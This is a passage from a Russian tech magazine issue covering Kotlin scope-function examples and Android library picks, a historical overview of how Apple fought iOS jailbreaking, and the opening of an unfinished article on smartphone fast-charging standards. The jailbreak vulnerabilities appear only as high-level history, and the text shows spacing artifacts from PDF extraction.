   область видимос ти или выполнить код только в том случае, если объ ект
   не равен null:


   person?.let {
       it.name = "Tony Stark"
   }

 • with позволя ет выпол нить код в контексте объекта:


   val person = with(Person()) {
       name = "Tony Stark"
       age = 52
       this
   }

 • apply — более удобный в использовании аналог with:


   val person = Person().apply {
       name = "Tony Stark"
       age = 52
   }

 • also — ана лог apply, внут ри которого можно исполь зовать ключевое сло‐
   во it:


   val person = Person().also {
       it.name = "Tony Stark"
       it.age = 52
   }

 • use — сво его рода аналог try в Java:


   FileReader("input.txt").use {
       // Read the file
   }

 • run — похожая на with, let и apply функция, позволя ющая вернуть зна‐
   чение;
 • takeIf — функция для фильтрации:


   val index = "Kotlin".indexOf('K').takeIf { it > 0 } ?: 0

 • takeUnless — противоположность takeIf:


   val index = "Kotlin".indexOf('K').takeUnless { it < 0 } ?: 0

 • measureTimeMillis позволяет измерить скорость выпол нения блока
   кода:


   val executionTime = measureTimeMillis {
       // Do your task
   }
   println("Execution Time = $executionTime ms")


Как писать красивый и понятный код на Kotlin
Handsome codes with Kotlin — как писать красивый и понятный код на Kotlin.
Автор  приводит  несколько  интерес ных  при меров,  которые  позволяют
работать со стан дартным API Android и популяр ными сторонними библиоте‐
ками в сти ле Kotlin.
  Один из примеров — библиотека Picasso, требующая соз дания объ‐
екта‐колбэка, который должен реализовать методы onSuccess() и onError(
), даже если один из них не нужен. При помощи некоторых трюков можно
добавить в Picasso функцию‐рас ширение, которая поз волит использовать
лямбды вместо объекта‐колбэка.


Статья о перегрузке опе рато ров в Kotlin
Operator Overloading and Conventions in Kotlin — статья о перегрузке опе рато‐
ров в Kotlin. То есть о том, как добавить возможность скла дывать, вычитать,
умножать, сравнивать, сортировать и проводить другие операции над своими
или любыми дру гими объекта ми (с помощью фун кций‐расширений).


Вве дение в раз работку приложе ния для управле ния BLE-устрой-
ствами и получе ния дан ных от них
Bluetooth Low Energy on Android, Part 1 — введение в разработку приложения
для управле ния BLE‐устрой ствами (умные часы, лампочки и прочий  IoT)
и получе ния от них данных.


Пе ревод статьи челове ка, придумавшего ставить m перед полями
в Android
«Я являюсь при чиной появления венгерской нотации в Android» — перевод
статьи человека, при думавшего ставить m перед полями в Android.


БИБЛИОТЕКИ
 • generator‐kotlin‐android — генератор типового шаблона приложе ния, сле‐
  дующе го парадигме MVP с задейство вани ем наиболее востребованных
  биб лиотек: RxJava, Retroﬁt, Gson, Dagger 2, Butterknife, Espresso, Mokito
   и других;
 • RangeSeekBar — тон ко нас траиваемый SeekBar;
 • Spotlight — простой в использовании визард для обу чения работе с при‐
   ложением;
 • Okuki — концептуально схо жая со Square Flow биб лиоте ка, упрощающая
   навигацию между сос тояниями интерфейса;
 • FlowR — библиотека для упро щения навига ции между фрагментами;
 • Fotoapparat — библиотека, существен но упрощающая работу с Camera2
   API;
 • FaceDetector — распознавание лиц в режиме реального времени;
 • FileListerDialog — диалог выбора фай ла.

На этом все.
X‐MOBILE





   Михаил Филоненко
    mﬁlonen2@gmail.com





                   КАК НА ПРОТЯЖЕНИИ
                   ДЕСЯТИ ЛЕТ APPLE
               БОРОЛАСЬ С ХАКЕРАМИ
                     И ПОБЕДИЛА




Долгие годы джейлбрейк был необ ходимой и естественной
про цеду рой для большинс тва прод винутых «яблочников».
Однако сегодня даже создатель Cydia Джей Фриман (saurik)
кон статирует смерть джейлбрейка. Новые ути литы для взло‐
ма выходят крайне редко, твики не обновля ются, а многие
из тех, кто не мог пред ста вить сво ей жиз ни без взломан ного
iPhone, теперь спокойно обхо дятся без него. Как же все
это стало реаль ностью?


ПОЧЕМУ ПОЯВИЛСЯ ДЖЕЙЛБРЕЙК?
iPhone (тогда еще просто iPhone, единственный и неповторимый) был дей‐
ствительно револю ционным устрой ством. На многие годы впе ред он стал
эта лоном того, как должен выглядеть сов ременный смар тфон: большой
экран, отсутствие физических кнопок, быстрый и удобный UI, оптимизи рован‐
ный для управле ния пальцем. Все это стан дарты, которым сегодня следует
любой производитель смар тфо нов.





                        Первый iPhone

Проблема сос тояла только в том, что за исключени ем пол ноценного браузе‐
ра, муль титач‐жестов и про игрывателя, унас ледованного еще от iPod, первый
iPhone не имел и не умел практически ничего. Никакого App Store, где можно
скачать приложе ние или игру, никакой записи видео, ни системы копиро‐
вания‐встав ки. Даже обои на главный экран поставить нель зя.
  Джобс хотел, что бы каждая прог рамма, каж дая функция на его устройстве
была уни кальна, неповторима и совершенна. Но разве воз можно обес печить
весь спектр пот ребностей пользователя в одиноч ку, когда даже разрабаты‐
ваемый образец, показанный на презен тации, был практически неработос‐
пособен, а ведь для демонстрации фун кци ональнос ти был избран  так
называемый Gold Way?





               Стив Джобс пред став ляет первый iPhone

В общем, сложилась парадоксаль ная ситуация: есть устройство, которое
наделе но колос сальным потенциалом (благодаря основанной на macOS опе‐
раци онной системе, высокой производительности и огромному, по тем вре‐
менам, сенсорно му экрану), да вот толь ко не умеет оно практически ничего.
Поэтому вскоре после того, как стало ясно, что получить права root на устрой‐
стве не составляет осо бого труда (это удалось спустя одиннадцать дней пос‐
ле релиза iPhone), хакеры начали думать, как сделать устрой ство более
полез ным для его обладате ля.


ПЕРВЫЕ ГОДЫ JAILBREAK
Сам по себе Jailbreak, то есть получе ние прав root в iOS, по большому счету
не давал никаких преиму ществ. Систему можно иссле довать, заменить стан‐
дартные рингтоны или внес ти правки в сис темные конфигурационные файлы,
но это все. Что бы по‐настоящему расширить функциональность смартфо на,
нуж ны были при ложения, но, так как ни SDK, ни магази на при ложе ний тогда
не существовало, их пришлось изоб ретать на колен ке.
   Так появился Installer — инсталлятор приложений, основанный на системе
управле ния пакетов Debian. Чуть поз же ему на смену пришла Cydia, которая
ста ла стан дартом для установки стороннего софта на все последующие годы.
Во мно гом это му спо собство вали соз датели автоматизированных инс тру‐
ментов джейлбрей ка, таких как PwnageTool, которые автоматически устанав‐
ливали Cydia на устройство в составе кас томной прошивки.





                                  Cydia




                      Кастомные прошивки на базе iOS выпускались
                        вплоть до появления устройств с процес сорами
                     А5 (то есть до iPhone 4S и iPad 2). Одним из их
                     символов  стал  надкушенный  ананас,  пароди‐
                    рующий логотип Apple. Кастомные прошивки поз‐
                       воляли активировать функции, не предусмотрен‐
                     ные Apple (нап ример, многозадачность на iPhone
                         3G), отключать ненуж ные демоны и язы ковые
                        пакеты. Основной же целью их создания была
                       разлочка телефо нов и уста новка Cydia.


2007–2010 годы справедливо можно назвать золотой эрой джейлбрейка.
В одно и то же время могло существовать множество джейлбрейк‐утилит
для одной и той же версии iOS: QuickPWN, RedSn0w, PwnageTool, Sn0w‐
Breeze, Star — знакомые наз вания для пользователей iPhone тех лет. Взло‐
мать устройство, откатить его на ста рую версию iOS, разлочить загрузчик
или модем тогда было проще простого, и это делал чуть ли не каждый второй
поль зователь iPhone.





                     Инструмент QuickPWN

Стремительно развивалось и сооб щество разработчиков. Благодаря фрей‐
мворку MobileSubstrate, позволя ющему вносить изменения в компоненты iOS
на лету, разработ чики могли не только писать при ложения, но и модифи циро‐
вать стандартные приложения, раз работанные Apple.
   Та кие модификации получи ли имя «твики», и с каждым днем их станови‐
лось все боль ше. Фантазия разработчиков казалась поистине бес крайней:
многие шутят, что первый Android, вышедший годом поз же, — это прос то
iPhone с набором джейлбрейк‐тви ков.
  В те годы Jailbreak, вероятно, был очень полезен для Apple. Раз работчики
сами предлагали вари анты решения тех или иных проблем, ком пании оста‐
валось толь ко выбирать и внедрять лучшее. Релиз App Store в iPhone OS
2.0 не при вел ни к краху джейлбрей ка, ни к ослабле нию его позиций; все при‐
ложения в App Store были очень ограниче ны и малофункци ональны.




                    Среди первых приложений в Cydia были Mobile‐
                           Terminal — пер вое и до сих пор самое популяр ное
                      при ложение для доступа  к командной стро ке,
                  BSD  subsystem — набор юникс‐команд,  пор‐
                       тированных из BSD, SummerBoard, предшествен‐
                       ник WinterBoard, программы для модификации
                      интерфейса, Nullriver Ringtone Pack — набор кас‐
                      томных рин гто нов. Из игр были iPong и порт
                     Doom.


Настоящим про рывом стал JailbreakMe — веб‐сайт, использующий уязвимос‐
ти в браузе ре iOS: баг в обра ботке файлов фор мата TIFF в iPhone OS
1.1.1 и уязвимость в биб лиотеке FreeType (версии iOS 3.1.2–4.0.1 и 4.3–
4.3.3), которая была нужна для обработки шрифтов в PDF‐документах. Сайт
определял версию iOS и показывал либо специаль ным обра зом сфор‐
мированное изоб ражение в формате TIFF, либо невидимый iFrame с PDF
внутри, который при обработ ке запускал код экс плоита.





                         Часть кода JailbreakMe

Сделать джейлбрейк с помощью JailbreakMe было нас толь ко прос то, что
Apple приш лось заб локировать сайт на уровне роутеров в сво их фир менных
магазинах. Apple тог да пыталась защитить свои устройства, устра няя самые
оче видные баги в новых версиях, но казалась беспомощной в своих попыт ках
уничтожить джейлбрейк. Пользователей предуп режда ли о необ ратимости
взло ма и о принуди тельной блокировке всех таких устройств, в реаль ности же
откат на ста бильную версию про шивки не составлял особого труда.
  В 2009 году Apple попыталась объявить джейлбрейк незаконным, опи‐
раясь на то, что он наруша ет усло вия лицензионного соглашения. После дли‐
тель ного разбирательства суд откло нил этот иск и раз решил взлом всех
телефонов. Но суд не запретил Apple всячес ки противодейство вать этому,
а уже с iPhone 4S ком пания из Купертино начала принимать весь ма серь‐
езные защитные меры.


ПЕРИОД РАСЦВЕТА (IOS 4–8)
В 2011 году Apple устранила все известные ошиб ки в загрузчике, а потому
модели 2010 года ста ли последни ми с возможностью установки кастомных
про шивок. Но еще большее вни мание Apple уделила блокировке анлока.
Поль зователи iPhone 4 с некото рыми версиями модемов лишились воз‐
можнос ти отвязки от оператора, в даль нейшем это стало возможно только
при помощи прок си‐сим, которые приходится докупать отдельно.
  Однако хакеров, выпус кавших утилиты для джейлбрейка, меньше не ста‐
нови лось. Самые прос тые и очевидные уязвимости были, конеч но, закрыты,
однако iOS взламывали уже через месяц‐два пос ле релиза прошивки.
  Чем больше станови лось пользователей iPhone, тем боль ше появлялось
тви ков в Cydia. Пер вые утилиты из главного неофициального магази на были
нап равле ны чаще все го на поверхностную кас томизацию внеш него вида
и работу с терминалом, а программы, которые можно было свобод но
выложить в App Store, ушли отсюда еще в 2008–2009 годах. Но в 2010–
2015 годах появ лялась бездна разнооб разных интерфей сных решений. А тви‐
ков, акти вирующих или дезак тивирующих какую‐либо функцию, было и вовсе
неисчислимое количество.





  Благодаря MobileSubstrate интерфейс iOS можно было менять до неуз‐
  наваемос ти

Именно в это вре мя наметились клю чевые проблемы Cydia. Извлекать
какую‐либо прибыль из приложе ний было практичес ки невозможно, что сни‐
жало качество выпускаемо го соф та. Но еще более важной для пользователей
была другая проблема. Первые твики нельзя было устанавливать на новые
версии iOS. Конеч но, появлялось множес тво аль тернатив, но в связи со все
боль шим раздуванием магази на найти их ста нови лось не так‐то просто. Меж‐
ду тем в App Store при ложения почти всег да были совместимы с предыду‐
щими версиями iOS.
   Apple также прикладыва ла уси лия для того, чтобы убить Cydia. Она
не толь ко всерь ез взялась за повышение безопасности сис темы, но и осна‐
щала ОС все большей функциональностью и новыми API, с помощью которых
раз работ чики получали доступ к возможнос тям ОС, ранее доступным толь ко
пос ле джей лбрей ка.
   Разработ ка джейлбрейк‐утилит ста новилась все сложнее, старые коман ды
хакеров прекращали свою работу. Спасти положение попытались китайцы
(Pangu и PP Jailbreak), но они не смогли зна чительно улучшить дело, и к
девятой версии iOS джей лбрейк уже был на грани смерти.




                     Несколько идей, которые Apple поза имствовала
                         у джей лбрейк‐сообщества. Анимированные обои,
                       внедренные в iOS 7, были ранее реализова ны
                        в твиках  LivePapers и 3DBoard. Иконку часов
                     оживляла утилита LiveClock. SearchSettings акти‐
                      вировал поиск по нас трой кам. Но самые извес‐
                      тные заимствования — это «центр управления»
                          (SBSettings) и  панель многозадачности  (Auxo
                      и Dash).



ПОСЛЕДНИЕ ГОДЫ ДЖЕЙЛБРЕЙКА
Старания Apple при вели к тому, что джей лбрейк стал просто невыгоден.
Для обнаружения и экс плу атации новых уязвимос тей требовались огромные
ресурсы и затраты вре мени. Такую работу уже мало кто соглашался делать
за идею — най денные баги можно было про дать Apple или на черном рынке.
  Вместо борьбы с хакерами Apple начала переманивать их в свою ком‐
панию. В начале 2016 года в Apple ушли Chronic (Уилл Страфак) и p0sixninja
(Джошуа Хилл). Тодеско, разработчик утилиты для джей лбрейка iOS 10, тоже
неод нократно заявлял о сотрудничес тве с «яблочной» командой по безопас‐
ности. Кроме того, Apple инициировала прог рамму воз награж дений за отчеты
об уязвимостях.
  В iOS 9 появилась новая технология защиты системы Rootless, которая
све ла к миниму му шан сы взлом щиков. Кроме того, обновле ния, закрыва‐
ющие уязвимос ти, ста ли выходить буквально через несколько дней пос ле их
обнаружения, поэтому к моменту, когда jailbreak‐утилита, экс плуатирующая
уязвимость, появ лялась на свет, исполь зовать ее уже мало кто мог. Продол‐
жили делать джей лбрейк только те, кто под жидал его на старых версиях про‐
шив ки.
  С выходом iOS 10 все ста ло еще хуже. Лука Тодеско, на данный момент
уже свернувший свою разработку, соз дал инструмент джейлбрейка Yalu,
однако он совместим только с 64‐битными устрой ства ми, не включая iPhone
7 и iPhone 7 Plus, и только с iOS 10–10.2. Позднее надс тройка над Yalu
для iPhone 7 и 7 Plus все‐таки появилась (mach_portal), однако если сам Yalu
находится в бета‐тесте, то mach_portal оказался еще более нестабиль ным
и сырым. Вдобавок эти инструменты выполняли привязанный джейлбрейк,
который необ ходимо акти вировать каждые семь дней, используя компьютер.
  Недавно команда KeenLab, ранее не выпускавшая утилит для взломов,
про демонстри ровала джейлбрейк iOS 11 и iOS 10.3.2 и заяви ла, что он
работа ет на всех устрой ствах. Однако опыт прошлых лет подсказывает, что,
даже если это не блеф, разработка все рав но может не дойти до обычных
поль зовате лей.





         KeenLab демонстрирует инстру мент джейлбрей ка iOS 11

Пос коль ку количество пользователей Cydia ста ло рез ко сокращаться, раз‐
работ ка тви ков также затухает. Если для iOS 9 еще выходили достойные вни‐
мания решения, то в десятой версии все стало совсем скучно: большинс тво
раз работ чиков не захотели утруждать себя портирова нием твиков на новую
ОС.
  В целом для любителей джейлбрейка настали не лучшие вре мена. Кто‐то
готов смириться с неудобства ми и начать исполь зовать iOS без модифи‐
каций и расширений, кто‐то переходит на альтернативную платформу. Apple
же старается компенсировать утра ту, добавляя всё новые функции в свои
про шив ки.




Немногие разработчики утилит для джейлбрей ка готовы рас ска зывать о том,
какие уяз вимос ти они использовали для взло ма iOS и как работают их инс тру‐
менты. Но бывают и исключения. В 2016 году хакеры из команды Pangu выс‐
тупили на кон ферен ции Black Hat с презентацией, пос вященной взлому iOS
версий 7, 8 и 9.
  Для взлома iOS 7.1 было достаточно сформировать динамическую биб‐
лиотеку, а затем подписать ее сертифика том с истекшим сроком и заг рузить
в системный про цесс с помощью про писывания пути до библиотеки в сис‐
темной переменной DYLD_INSERT_LIBRARIES. Далее библиотека экс плуати‐
ровала уязвимость в ядре для получе ния без гра ничных прав root.
   Apple зак рыла брешь, реализовав механизм Team ID validation, запреща‐
ющий заг рузку сто ронних биб лиотек. Однако для некоторых сер висов ком‐
пания сде лала исклю чение, чем и вос пользовались Pangu для реализации
джейлбрей ка iOS 8. Pangu 8 внедрялся в neagent, реализующий поддержку
сторонних VPN‐сервисов.
   Apple исправила баг в iOS 8.3. Поэто му ребята из Pangu пошли дру гим
путем и вос пользовались уяз вимостью в системе обмена сообщениями XPC,
а точнее реали зации системы обработки сообщений в демоне assetsd.
Это ста рая как мир ошиб ка парсинга путей к файлам, называ емая Path Tra‐
versal Vulnerability, — передав демону осо бым образом сформированный
путь, мож но было переза писать любой сис темный файл.
   Эту уязвимость Apple закрыла в iOS 9, и хакеры вновь вернулись к идее
использовать механизм заг рузки внеш них биб лиотек и в этот раз сфор‐
мировали цепоч ку атак, эксплуати рующих сра зу нес колько уязвимостей. Pan‐
gu 9 подключал Developer DiskImage (DDI) с устаревшей уяз вимой (но под‐
писанной ключом Apple) версией демона vpnagent, далее использовал оче‐
редную уязвимость в XPC для того, чтобы скопировать vpnagent в систему,
под клю чал дебаг гер к vpnagent, в результате чего в последний можно было
загрузить любую биб лиотеку на манер Pangu 7. Затем биб лиотека исполь‐
зовала уязвимость в ядре для отклю чения sandbox и получе ния пол ных прав
в системе.



ЗАКЛЮЧЕНИЕ
Когда око ло десяти лет назад первый джей лбрейк позволил пре одолеть все
наложенные Apple ограничения, ник то не сом невался в его необходимос ти.
Без джейлбрей ка iPhone был обычным телефоном, а с ним превращал ся
в настоящий карманный компьютер.
  Вре мена изменились, смартфоны стали мейнстримом, функциональность
iOS расширилась в разы, а выпуск инс трумен тов для джейлбрей ка практичес‐
ки прек ратился. Так нужен ли джейлбрейк сегодня, в мире, где большинство
владельцев iPhone использует его только для обще ния в соцсетях?
  Всем нужен выбор, но каков он должен быть? iOS, вероятно, уникальна
по своему уровню безопас ности, а без перекрытия джейлбрейк‐уяз вимостей
это никогда не про изошло бы. Так что выбор сей час сохранил ся — выбор
между открытостью и защищенностью.
X‐MOBILE





                                                                             Олег Афонин
                                                                                     Эксперт по мобильной
                                                                                   криминалистике компании
                                                                                        «Элкомсофт»
                                                                                             aoleg@voicecallcentral.com





             СТАНДАРТЫ, ОСОБЕННОСТИ
            И ПРОБЛЕМЫ ТЕХНОЛОГИЙ
                 БЫСТРОЙ ЗАРЯДКИ




С выходом каждого нового поколения смартфонов процес‐
соры становят ся всё быс трее, разрешение экрана — всё
выше, приложения — всё про жорливее, а аккумуляторы...
Аккумуляторы всё те же. Что бы хоть как‐то компенсировать
этот недостаток, про изво дите ли  используют  технологии
быстрой зарядки. Но, кро ме пре иму ществ, они могут при‐
нести вла дель цу смартфо на массу проблем — от банальной
несов местимости и снижения срока службы аккумулятора
до сожженных смартфо нов и бло ков питания.


На сегодняшний день нам доступен широкий спектр протоколов зарядки,
раз рабатываемых и продвигаемых разными компаниями и организа циями.
По воз можнос ти попробу ем при держиваться хро нологии.


ОБЫЧНЫЙ USB
USB допускает ток не более 500 мА при нап ряжении 5 В. Лишь много поз‐
днее, с выходом спе цифи кации USB 3.0, максимальный ток был поднят
до 900 мА. Обычным кнопоч ным телефо нам, которые стали выходить не с
собствен ными разъема ми для заряда, а со штекера ми mini‐, а потом и micro‐
USB, вполне хватало небольшой мощ ности.
  Все изме нилось с выходом смартфонов, емкость акку муляторов которых
в разы пре вышала относительно небольшую емкость батарей кно почных
телефонов.  Даже  небольшие  по  современным  меркам  аккумуля торы
с емкостью 1500 мА ⋅ ч уже хотелось заряжать быстрее, чем за 4–4,5 ч (вре мя
с уче том потерь при зарядке и естес твенного замедления скорос ти заряда
пос ле 80%). Воз никла необ ходимость каким‐то образом передать больший
ток заряда по стандартному кабелю, при этом не спа лив случайно контроллер
USB, если устройство подклю чат к компьюте ру.


USB BATTERY CHARGING REVISION 1.2 (BC1.2)
Этот стандарт был при нят в далеком 2011 году и позволял ранним устрой‐
ствам заряжаться от разъ емов USB силой тока до 1,5 А при напряжении 5 В.
Стан дарт при нят организацией USB‐IF, поэто му его использование для про‐
изводителей бесплатно. По современным меркам он весь ма примитивен: тип
зарядного устройства опре деляется по нап ряжению на контактах D+ и D‐.
  Ссылки:
 • USB battery charging: it’s harder than it looks
 • USB Battery Charging 1.2 Compliance Plan


QUALCOMM QUICK CHARGE 1.0
Был обнародован компанией Qualcomm в 2013 году с чипсетами Snapdragon
600 (и, кста ти, используется до сих пор в младших чип сетах, например Snap‐
dragon 400). Здесь максимальный ток подняли до 2 А. Механизм определения
зарядного устройства стал значительно умнее, поэтому шансов получить нуж‐
ный ток заряда у устройств, использующих QC 1.0, стало боль ше.
  Ссылки:
 • Qualcomm Quick Charge 1.0 Battery Charger ICs
 • Qualcomm Quick Charge 1.0: Less Time Charging, More Time Doing


СТАНДАРТЫ APPLE И SAMSUNG
При мерно в то же вре мя Samsung и Apple парал лель но раз работа ли свои
собствен ные схе мы определения «правильных» заряд ных устройств. Так,
у Apple появились устрой ства класса Apple 1.0A (поз днее к ним добави лись
Apple 2.1A), которые определя ли наличие зарядного устройства соответс тву‐
ющей мощ ности собственным, несов местимым со спе цификацией USB‐IF
спо собом. Похожая и несовместимая схе ма была и у Samsung.


ПЕРВЫЕ УНИВЕРСАЛЬНЫЕ ЗАРЯДНИКИ
Со вре менем производители зарядных устройств стали делать попыт ки
как‐то стандарти зиро вать протоколы. К примеру, вот этот монстр‐ось миног
предлагал пять незави симых выходов, один из которых мог успешно заряжать
iPhone по стандарту Apple 1A, вто рой — iPad по стандарту Apple 2.1A, тре‐
тий — план шеты Samsung, а два других — все остальные устрой ства, сов‐
местимые со специфи кацией USB‐IF.





             Множес тво разъемов, есть где запутаться

Ужасно, прав да? Мало того что зоопарк коннекторов, нам еще и предлага‐
ется выбирать «пра вильный» порт, в который его вот кнуть.
   Также существовали вот такие адаптеры.





Уверен, ты подоб ное не зас тал, но в нашей лаборатории экземпляр име ется.
В первых поколениях адаптеров просто‐напросто замыкались контакты Data,
что давало совмести мость только с USB‐IF (и заод но — с Quick Charge 1.0);
в последующих версиях использовался чип, который пытался опре делить,
какое имен но устрой ство подклю чено, и выполнял необ ходимые действия,
чтобы под ключенный телефон или планшет распознал «быструю» зарядку.
  Наконец, при мер но три года назад начали появлять ся заряд ные устрой‐
ства со встроенной логикой определения нагрузки. Разнообразные системы
IQ, AIQ и им подобные выполняют единственную функцию: определить, какое
устройство заряжается — Apple (1A, 2.1A), Samsung или соответствующее
стандарту USB‐IF, и сооб щить устройству, что оно подключено именно
к  зарядному  устрой ству,  а  не  к  компьюте ру.  Сегодня  большинс тво
более‐менее качественных блоков питания от незави симых произво дителей
обо рудовано подобной схемой.





                За рядная стан ция с поддержкой AIQ

Прав да, бардак? А ведь мы еще даже не начали говорить о стандартах «быс‐
трой» заряд ки в их современ ном понима нии. Поверь, дальше будет хуже!


QUALCOMM QUICK CHARGE 2.0
Был анон сирован в 2013 году, но впервые использовал ся в устройствах
на Snapdragon 800 начиная с 2014 года. Этот стандарт оказал ся дол гожите‐
лем, пережив два поколения процес соров компании Qualcomm: Snapdragon
800 (801, 805) и Snapdragon 808, 810.
  Принципи альное отли чие QC 2.0 от всех ранее сущес твовав ших стан‐
дартов — исполь зование различных комбинаций напряжения и силы тока
из ряда 5, 9, 12 В и 2 и 1,67 А. Обрати внимание: если сила тока может варь‐
ироваться в про цес се заряда, то нап ряжение может выбираться только
из фиксированного списка зна чений 5, 9 или 12 В. К этому мы еще вер немся,
когда будем рассматривать стан дарт следующе го поколения — QC 3.0.
  Для чего вообще потребовалось поднимать напряжение, а не силу тока?
Клю чевой момент здесь — совмести мость с огромным парком сущес тву‐
ющих аксессуаров, кабелей и заряд ных устройств. Дело в том, что на момент
выхода спе цификации QC 2.0 все еще использовался физический фор мат
разъемов USB‐A на одном конце и microUSB на другом. Их спецификация
не подразумевает переда чу тока, превышающего 2,4 А при нап ряжении 5 В.
Как известно, тепловые потери в про водах растут пропорционально току
и квадрату сопротив ления. Повышение силы тока при неизменном нап‐
ряжении 5 В могло привести к опасному наг реву в области разъемов, избы‐
точным теп ловым потерям в самом кабеле, перегреву и потенциаль ному
выходу из строя зарядных портов — и неп ременно привело бы, если бы поль‐
зователь брал для зарядки не комплектный кабель или ЗУ с фик сированным
про водом, а другой, случайный шнурок. Повышение напряжения поз волило
одним махом снять проб лему совмести мости с сущес твующими проводами:
теперь максималь ный ток ни при каких обсто ятельствах не превышал зна‐
чения 2,4 А, фак тичес ки ограничиваясь зна чением 2 А.
  Впервые вместо ненадежного аналогового метода опре деле ния заряд‐
ного устройства был использован метод цифровой ком муникации (ведь
обидно было бы сжечь контроллер заряда случайно попавшим на него нап‐
ряжени ем в 12 В). В целом использование комбинации из планшета/телефо‐
на с QC 2.0 и соот ветствующе го зарядного устрой ства давало неплохую
гарантию, что зарядка пой дет именно по быстрому протоколу.




                        Кста ти, максималь ный ток пода ется по стандарту
                        только в самом начале зарядки, ког да аккумуля‐
                        тор пуст или прак тически пуст. С повышением
                       уров ня заряда снижается подава емая на акку‐
                      мулятор мощ ность, а на уров не примерно 80%
                        ско рость заряда зачастую и вовсе неотличима
                         от заряд ки от «компьютер ного» порта. Телефон
                       очень быстро набирает первые 40–50% заряда,
                       пос ле чего скорость зарядки постепенно замед‐
                        ляется, и пос ледние единицы про центов могут
                       набираться почти столько же времени, сколько
                      первые 50.


С таким резким скачком в мощ ности и скорос ти зарядки (здесь дос‐
тижимы 18 Вт) возникла дру гая проб лема: аккумуляторы при зарядке стали
перегреваться, и химия батарейки начина ла деградировать, что со вре менем
при водило к сни жению ее ресурса. Да, в стан дарте были заложены «безопас‐
ные» зна чения температур, но максимальная скорость зарядки была в те годы
таким значительным мар кетинговым преиму щес твом, что о сроке жизни акку‐
муляторов (которые все чаще ста нови лись несъемны ми) про изводители
предпочитали если даже и задумываться, то не говорить покупателям.
  Си туация ста ла еще хуже с выходом «горяче го» поколе ния процессоров
Snapdragon 808 и 810, одновременно с которы ми в отдельных моделях
появи лись разъ емы USB‐C. Пос кольку Android склонен к выпол нению отло‐
женных задач (нап ример, пакетному обновлению установленных приложений)
именно при подклю чении зарядки, перегрев процессора совместно с перег‐
ревом аккумулятора приводи ли к печальным последстви ям: процессоры
в буквальном смысле отпаивались от материн ских плат, а аккумуля торы
выходили из строя быс трее, чем заканчивался гаран тийный срок. Яркий при‐
мер — коллектив ный иск к компании LG (мас совый выход из строя устрой ств
LG G4, G Flex 2, Nexus 5X).
  Еще одна проблема: массовое появление устройств с разъемами USB‐C
в 2015 году совпало по времени с выходом ряда устрой ств на чипсетах
поколения Qualcomm 808/810. Новый стандарт фик сировал для производите‐
лей кабелей более жесткие требова ния к пропускаемому току. Так, у кабеля
с разъемами USB‐C на обо их концах, если он сделан без нарушений спе‐
цифи кации, не должно быть проб лем с переда чей тока в 3 А. Но компь ютеров
и зарядных устройств, оборудованных разъема ми USB‐C, на рын ке в тот
момент в достаточном количестве просто не было, и подавляющее боль‐
шинство производителей укомплек товывало смар тфоны обычной USB‐заряд‐
кой с разъемом USB‐A и кабелем со стан дартным «большим» разъ емом USB‐
A с одной сто роны и USB‐C — с другой.
  При использовании подоб ных кабелей с медленной зарядкой проб лем
не возникало. Их исполь зование с зарядками стан дарта Quick Charge 2.0 так‐
же не вызывало никаких неприятностей — в конце концов, QC 2.0 создавал ся
с оглядкой на сов местимость. Проб лемы — и проб лемы серьезные — стали
воз никать тогда, когда на рынок вышел ряд моделей, исполь зующих альтер‐
натив ный стандарт быстрой зарядки, основанный на откры той спецификации
USB‐IF для USB Type‐C 1.2.




Не которые произво дители называли стандар тные способы быс трой зарядки
сво ими собс твенными маркетинговыми терминами. Вот, к примеру, Samsung.
Samsung Advanced Fast Charging — торговая марка компании Samsung,
которой обоз началась зарядка по стандарту Quick Charge 2.0. Соответствен‐
но, пол ная совмести мость с QC 2.0 — но и возможность для Samsung
в любой момент сме нить плас тинку, не меняя названия тех нологии. Что,
собствен но, как‐то проделала Motorola, перек лючившись в своей технологии
быстрой зарядки Turbo Power с Quick Charge 2.0 на новый стандарт USB PD
(5 В / 3 А) без изме нения названия. Путани ца? Не то сло во, но в случае с Mo‐
torola помогает, что зарядные устройства со «старым» Turbo Power были обо‐
рудованы несъемными кабелями с разъемом microUSB, а «новые», осно ван‐
ные на USB PD, идут с разъ емом USB‐C.



HUAWEI FAST CHARGE PROTOCOL (FCP)
FCP — собствен ная раз работка компании Huawei, которая должна была кон‐
куриро вать с Quick Charge 2.0, заряжая смартфоны напряжением 5 или 9 В с
силой тока 2 А. Обо рудованные ей телефо ны, как правило, включали и под‐
держку QC  2.0, что позволяло использовать многочис ленные зарядные
устройства, сов мести мые с этой технологией. Пос кольку Huawei не лицен‐
зировала свою технологию другим производителям, известно о ней немного
и цен ность ее сом нительна. Зато — собствен ная разработ ка, как и процес‐
соры Kirin.


USB TYPE-C 1.2
Спе цификация USB Type‐C 1.2, допус кает передачу тока до 3 А при неиз‐
менном нап ряжении 5 В. В пер вом поколении смартфонов (Microsoft Lumia
950, 950XL, Google Nexus 5X, 6P), да и в большинстве современных, за ред‐
кими исключени ями, используется именно эта спецификация, а не новый
(более сложный, но обратно совмести мый) стан дарт USB Power Delivery.
  Новый открытый стандарт быс трой зарядки прост и очевиден. Его реали‐
зация не тре бует от производите лей боль ших усилий, использования проп‐
риетарных контроллеров заряда или каких‐либо лицен зионных отчислений
(стандарт от USB‐IF полностью бесплатен для производителей). Казалось бы,
бери и пользуйся!
   Без подводных камней не обошлось. Даже для такой относительно скром‐
ной мощ ности в 15 Вт тре бовались новые кабели и зарядные устройства,
спо собные без проблем, потерь и перегрева выдерживать повышенный ток
заряда. И тут оказалось, что если зарядные устройства, спо собные кор ректно
и с пол ным соответствием специфи кации USB‐IF выдавать ток в 3 А, могут
соб рать мно гие про изво дители, то безопас ные шнурки, полностью соответс‐
твующие стандарту, — вещь почти мифичес кая, для сред него китайского про‐
изводителя недос тижимая. Проблема настоль ко необычная, возникшая бук‐
вально на ровном мес те, что мы выделим ее в особый раздел.


ПРОБЛЕМА С КАБЕЛЯМИ USB-C
В случае с про водами USB‐A → miniUSB все было достаточно прос то: про‐
вода, разъемы, изоляция. Да, мож но было сэкономить на сечении провод‐
ников, и тогда устрой ства заряжа лись чуть медленнее (в особо тяжелых слу‐
чаях — заметно медленнее), но большой катас тро фы в любом слу чае не про‐
исхо дило.
  Все изме нилось с выходом стандарта USB Type‐C и появлением кабелей
с соответствующими штекерами. Более‐менее сра зу производите ли научи‐
лись делать прос тейшие кабели, соот ветствующие спе цификации USB 2.0,
с разъ емами USB‐C на обо их концах кабеля.
  Намного слож нее оказалось сделать кабели, оборудо ванные физическим
разъемом USB Type‐C и соот ветс тву ющие спе цификаци ям USB 3.0, и прак‐
